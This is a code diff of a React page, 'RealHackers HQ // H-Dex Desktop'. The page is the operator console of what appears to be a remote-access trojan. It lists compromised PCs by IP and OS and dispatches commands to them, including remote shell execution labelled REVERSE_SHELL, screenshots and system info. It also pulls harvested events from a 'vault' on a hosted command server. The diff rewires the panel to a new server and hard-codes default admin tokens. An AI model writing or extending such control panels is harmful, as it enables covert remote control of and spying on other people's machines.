@@ -7,7 +7,7 @@ import {
   RefreshCcw,
   MessageSquare, Info,
   Camera, Link as LinkIcon, Activity,
-  Clipboard, Power
+  Clipboard, Power, Settings
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { toast } from 'sonner';
@@ -16,16 +16,13 @@ import { toast } from 'sonner';
 
 interface PCNode {
   id: string;
+  name: string;
+  ip: string;
+  os: string;
   status: string;
-  model?: string;
-  lastSeen?: number;
-  metadata?: {
-    permissions?: Record<string, boolean>;
-    androidVersion?: string; // Field used for OS name on PC
-    appVersion?: string;
-    cpu?: number;
-    ram?: number;
-  }
+  last_seen: string;
+  tag?: string;
+  is_active: number;
 }
 
 interface LogEntry {
@@ -49,10 +46,12 @@ const HDexPage: React.FC = () => {
   const [inputModal, setInputModal] = useState<{ open: boolean, command: string, label: string, placeholder: string } | null>(null);
   const [inputValue, setInputValue] = useState('');
 
-  const accentColor = '#3498db'; // PC Blue Accent
+  // Settings
+  const [showSettings, setShowSettings] = useState(false);
+  const [hdexUrl, setHdexUrl] = useState(localStorage.getItem('hdex_url') || 'https://talhasss-hdex-ultra-server.hf.space');
+  const [hdexToken, setHdexToken] = useState(localStorage.getItem('hdex_token') || 'hdex_admin_2026');
 
-  const backendUrl = localStorage.getItem('adex_url') || 'https://talhasss-adex-backend.hf.space';
-  const botToken = localStorage.getItem('adex_token') || 'talha-hq-secret-123';
+  const accentColor = '#3498db'; // PC Blue Accent
 
   const addLog = useCallback((text: string, type: LogEntry['type'] = 'info', data?: any) => {
     const newLog: LogEntry = {
@@ -65,63 +64,65 @@ const HDexPage: React.FC = () => {
     setLogs(prev => [newLog, ...prev].slice(0, 100));
   }, []);
 
-  const fetchResults = useCallback(async () => {
-    if (!selectedNode) return;
-    try {
-      const response = await axios.get(`${backendUrl}/api/v1/devices/${selectedNode.id}/commands/results`, {
-        headers: { 'x-adex-bot-token': botToken }
-      });
-      const results = response.data.results || [];
-      results.forEach((res: any) => {
-        if (!logs.some(l => l.data?.id === res.id)) {
-           addLog(`Result: ${res.command_name.toUpperCase()} -> ${res.status.toUpperCase()}`, res.status === 'success' ? 'result' : 'error', res);
-           if (res.command_name === 'screenshot' && res.status === 'success' && res.data) {
-              setLastSct(res.data); // Base64 data from client
-           }
-        }
-      });
-    } catch (err) {}
-  }, [selectedNode, backendUrl, botToken, logs, addLog]);
-
   const fetchDevices = useCallback(async () => {
     setLoading(true);
     try {
-      const response = await axios.get(`${backendUrl}/api/v1/devices`, {
-        params: { guildId: 'hq-guild', discordUserId: '123456789012345678' },
-        headers: { 'x-adex-bot-token': botToken }
+      const response = await axios.get(`${hdexUrl}/manage/devices`, {
+        params: { token: hdexToken }
       });
-      const allDevices = response.data.devices || [];
-      const pcNodes = allDevices.filter((d: any) => 
-        d.app_version?.includes('PC') || d.id.startsWith('PC-')
-      );
-      setNodes(pcNodes);
-    } catch (err: any) {} finally {
+      setNodes(response.data || []);
+    } catch (err: any) {
+      console.error("H-Dex fetch error:", err);
+    } finally {
       setLoading(false);
     }
-  }, [backendUrl, botToken]);
+  }, [hdexUrl, hdexToken]);
+
+  const fetchVault = useCallback(async () => {
+    if (!selectedNode) return;
+    try {
+      const response = await axios.get(`${hdexUrl}/vault`, {
+        params: { token: hdexToken, type: 'events', limit: 20 }
+      });
+      const events = response.data.data || [];
+      events.forEach((evt: any) => {
+        if (!logs.some(l => l.data?.id === evt.id)) {
+           addLog(`Event: ${evt.type}`, 'event', evt);
+           // Special handling for screenshots in events if needed
+        }
+      });
+    } catch (err) {}
+  }, [selectedNode, hdexUrl, hdexToken, logs, addLog]);
 
   useEffect(() => {
     document.title = "RealHackers HQ // H-Dex Desktop";
     fetchDevices();
     const interval = setInterval(() => {
       fetchDevices();
-      if (selectedNode) fetchResults();
+      if (selectedNode) fetchVault();
     }, 10000);
     return () => clearInterval(interval);
-  }, [fetchDevices, fetchResults, selectedNode]);
+  }, [fetchDevices, fetchVault, selectedNode]);
 
-  const sendCommand = async (commandName: string, payload: any = {}) => {
+  const sendCommand = async (type: string, data: any = {}) => {
     if (!selectedNode) return;
-    addLog(`Exec: ${commandName}`, 'cmd');
+    addLog(`Dispatch: ${type}`, 'cmd');
     try {
-      await axios.post(`${backendUrl}/api/v1/commands`, {
-        guildId: 'hq-guild', discordUserId: '123456789012345678', deviceId: selectedNode.id, commandName, payload
+      const response = await axios.post(`${hdexUrl}/manage/settings`, {
+        type,
+        target_id: selectedNode.id,
+        ...data
       }, {
-        headers: { 'x-adex-bot-token': botToken }
+        params: { token: hdexToken }
       });
-      toast.success(`COMMAND_SENT: ${commandName.toUpperCase()}`, { style: { background: '#000', color: accentColor, border: `1px solid ${accentColor}`} });
+      toast.success(`SIGNAL_SENT: ${type.toUpperCase()}`);
+      
+      // If it's a screenshot, we might get immediate data or wait for event
+      if (type === 'screenshot' && response.data?.status === 'success' && response.data?.data) {
+          setLastSct(response.data.data);
+      }
     } catch (err: any) {
-      toast.error(`COMMAND_FAILED: ${err.message}`);
+      toast.error(`SIGNAL_FAILED: ${err.message}`);
     }
   };
 
@@ -132,15 +133,14 @@ const HDexPage: React.FC = () => {
 
   const submitCommandInput = () => {
     if (inputModal) {
-      const payload = inputModal.command === 'shell' ? { command: inputValue } : { url: inputValue };
-      sendCommand(inputModal.command, payload);
+      sendCommand(inputModal.command, { command: inputValue, text: inputValue });
       setInputModal(null);
     }
   };
 
   const filteredNodes = nodes.filter(n => 
     n.id.toLowerCase().includes(searchQuery.toLowerCase()) || 
-    (n.model && n.model.toLowerCase().includes(searchQuery.toLowerCase()))
+    (n.name && n.name.toLowerCase().includes(searchQuery.toLowerCase()))
   );
 
   return (
@@ -166,6 +166,18 @@ const HDexPage: React.FC = () => {
         )}
       </AnimatePresence>
 
+      {showSettings && (
+         <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.9)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <div className="card" style={{ width: '500px', padding: '2rem', border: '1px solid #fff' }}>
+               <SectionTitle icon={Settings} label="H-DEX_UPLINK_CONFIG" color={accentColor} />
+               <input type="text" value={hdexUrl} onChange={e => setHdexUrl(e.target.value)} placeholder="H-DEX_SERVER_URL" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '1rem' }} />
+               <input type="password" value={hdexToken} onChange={e => setHdexToken(e.target.value)} placeholder="ADMIN_TOKEN" style={{ width: '100%', padding: '1rem', background: '#000', border: '1px solid #222', color: '#fff', marginBottom: '2rem' }} />
+               <button onClick={() => { localStorage.setItem('hdex_url', hdexUrl); localStorage.setItem('hdex_token', hdexToken); setShowSettings(false); fetchDevices(); }} className="btn" style={{ width: '100%', borderColor: accentColor }}>SAVE_AND_LINK</button>
+               <button onClick={() => setShowSettings(false)} className="btn" style={{ width: '100%', marginTop: '10px', background: '#222' }}>CLOSE</button>
+            </div>
+         </div>
+      )}
+
        <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem', background: 'rgba(52, 152, 219, 0.05)', padding: '1.2rem', border: '1px solid #1a3a5a' }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: '1.5rem' }}>
           <ShieldCheck size={28} color={accentColor} />
@@ -177,6 +189,7 @@ const HDexPage: React.FC = () => {
           </div>
         </div>
         <div style={{ display: 'flex', gap: '1rem' }}>
+           <button className="btn" onClick={() => setShowSettings(true)} style={{ padding: '0.6rem', borderColor: '#1a3a5a' }}><Settings size={18} /></button>
            <button className="btn" onClick={() => fetchDevices()} style={{ padding: '0.6rem', borderColor: '#1a3a5a' }}><RefreshCcw size={18} className={loading ? 'spin' : ''} /></button>
         </div>
       </header>
@@ -207,12 +220,12 @@ const HDexPage: React.FC = () => {
                    }}
                  >
                     <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
-                       <div style={{ fontSize: '0.9rem', fontWeight: '900' }}>{node.model || 'UNKNOWN_PC'}</div>
+                       <div style={{ fontSize: '0.9rem', fontWeight: '900' }}>{node.name || 'UNKNOWN_PC'}</div>
                        <div style={{ fontSize: '0.6rem', color: node.status === 'online' ? '#2ecc71' : '#444' }}>● {node.status.toUpperCase()}</div>
                     </div>
                     <div style={{ fontSize: '0.55rem', color: '#444', fontFamily: 'monospace' }}>{node.id}</div>
                     <div style={{ marginTop: '10px', fontSize: '0.6rem', color: '#888' }}>
-                       {node.metadata?.androidVersion?.toUpperCase() || 'UNKNOWN_OS'}
+                       {node.os?.toUpperCase() || 'UNKNOWN_OS'}
                     </div>
                  </div>
                ))
@@ -239,7 +252,7 @@ const HDexPage: React.FC = () => {
                 <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem' }}>
                    <AnimatePresence mode="wait">
                       {activeTab === 'SYSTEM' && (
-                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="sys" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))', gap: '1.2rem' }}>
+                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="sys" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '1.2rem' }}>
                            <ModuleButton icon={Info} label="SYS_INFO" onClick={() => sendCommand('info')} color={accentColor} />
                            <ModuleButton icon={Terminal} label="SHELL_EXEC" onClick={() => handleCommandWithInput('shell', 'REVERSE_SHELL', 'Enter command...')} color={accentColor} />
                            <ModuleButton icon={Camera} label="SCREENSHOT" onClick={() => sendCommand('screenshot')} color={accentColor} />
@@ -291,7 +304,7 @@ const HDexPage: React.FC = () => {
                  {logs.map(log => (
                     <div key={log.id} style={{ marginBottom: '8px' }}>
                        <span style={{ opacity: 0.3 }}>[{log.time}]</span> 
-                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : (log.type === 'result' ? '#fff' : '#444') }}>
+                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : (log.type === 'result' ? '#fff' : (log.type === 'event' ? '#f1c40f' : '#444')) }}>
                           {log.text.toUpperCase()}
                        </span>
                        {log.type === 'result' && log.data?.data && (
